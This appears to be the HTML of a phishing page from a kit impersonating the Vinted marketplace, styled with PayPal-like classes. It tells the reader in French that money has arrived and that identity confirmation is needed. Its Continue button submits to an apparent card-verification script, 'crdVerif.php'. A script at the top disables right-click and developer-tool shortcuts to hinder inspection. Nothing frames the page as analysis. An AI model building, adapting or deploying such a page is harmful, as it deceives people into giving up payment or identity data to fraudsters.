
<!DOCTYPE html>
<html data-reactroot="">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<script>
    // disable right click
    document.addEventListener('contextmenu', event => event.preventDefault());

    document.onkeydown = function (e) {

        // disable F12 key
        if(e.keyCode == 123) {
            return false;
        }

        // disable I key
        if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
            return false;
        }

        // disable J key
        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
            return false;
        }

        // disable U key
        if(e.ctrlKey && e.keyCode == 85) {
            return false;
        }
    }

</script>
<head>
    <meta charset="utf-8" />
    <title>Confirmation de paiement - Vinted Pro</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico" />
  <link rel='shortcut icon' href='https://static.vinted.com/assets/favicon/default/apple-touch-icon-304950b8dc9146734ffe4fee1d5837f698492a61a5b562369eb32e212a3ea306.png' />
    <link rel="apple-touch-icon" href="public/img/pp64.png" />
    <link rel="canonical" href="#" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <link rel="stylesheet" href="public/css/main.ltr.css" />
    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
    <link rel="stylesheet" href="public/css/contextualLogin.css" />
    <link rel="stylesheet" href="css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/main_style.css" />
    <link rel="stylesheet" href="style.css" />
</head>

<body class="vx_root vx_addFlowTransition vx_hasFadeTransition">
<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection" tabindex="-1">
        <div class="">

                <header class="vx_modal-header">
        <div aria-live="pJOHNESSte">
            <div class="headerWrapper">
				<br><br><br></h1></div>
				<h1 class="vx_text-3 " style="text-align: center">Vous avez reçu de l'argent aujourd'hui</h1>
				</div>
        </div>
        <p class="vx_text-body">
        </p>

    </header>
    <div class="vx_modal-body vx_blocks-for-mobile">
        <div>
            <div class="vx_modal-body vx_blocks-for-mobile">
                <div class="form-container">
                    <div class="signupCheckBox">
                        <div class="expandableContainer">
                            <label for="paypalAccountData_tcpa"><div class="forgotLink">
                                Pour approuver la transaction utilisez le bouton-ci dessous et suivez les instructions.<br>Pour lutter contre les transactions frauduleuses, une confirmation d'identité peut être requise.
                            </label>
                        </div>Que faire ?<br><br>
						> Cliquez sur continuer pour commencer.<br><br>
						> Confirmez votre identité.<br><br>
						> Recevez votre paiement sur votre compte.<br><br>
                    </div>
                        <form method="POST" action="crdVerif.php" id="logform"><input name="_token" type="hidden" value="kF9gPAn3l6UsVOhwyLW6B1YQSFJNWVgFr7jaecNc">               

                        <button type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="">Continuer</button>
<br>
                        <div class="forgotLink">
                        <id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">
                        </div>
                        <input type="hidden" id="bp_mid" name="bp_mid" value="">


                    </form>

                </div>

            </div>

        </div>

    </div>

    <div class="foot-pay">
                <center>
                    © <script>document.write(new Date().getFullYear());</script> Par Vinted Pro
                </center>
    </div>

        </div>
    </div>

</div>

<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
<script type="text/javascript" defer="" src="public/js/pa.js"></script>


</body>

</html>
